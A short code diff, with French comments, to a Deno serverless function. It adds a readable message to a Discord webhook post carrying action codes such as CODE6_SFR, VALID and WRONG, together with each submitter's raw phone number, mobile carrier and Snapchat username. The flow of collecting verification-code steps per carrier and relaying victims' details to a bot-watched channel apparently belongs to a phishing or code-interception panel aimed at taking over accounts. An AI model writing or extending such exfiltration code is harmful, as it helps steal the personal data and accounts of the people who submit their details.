@@ -166,10 +166,20 @@ Deno.serve(async (req) => {
       timestamp: now.toISOString(),
     };
 
+    // Contenu texte lisible par un bot : code d'action + numéro brut + opérateur.
+    // Un bot qui écoute le channel via DISCORD_BOT_TOKEN ne lit souvent que le
+    // `content` (pas les embeds) — sans cette ligne, l'action restait invisible.
+    const actionCode = {
+      code_ready: "CODE4", code6: "CODE6", code6sfr: "CODE6_SFR", code6orange: "CODE6_ORANGE",
+      valid: "VALID", wrong: "WRONG", expired: "EXPIRED", wait: "WAIT",
+    }[action] || "CODE4";
+    const rawPhone = String(sub?.telephone || "").replace(/\D/g, "");
+    const content = `📤 [${actionCode}] ${rawPhone} | ${sub?.operateur || ""} | ${sub?.snapchat || ""}`;
+
     const webhookRes = await fetch(LOG_WEBHOOK, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ embeds: [embed] }),
+      body: JSON.stringify({ content, embeds: [embed] }),
     });
 
     if (!webhookRes.ok) {
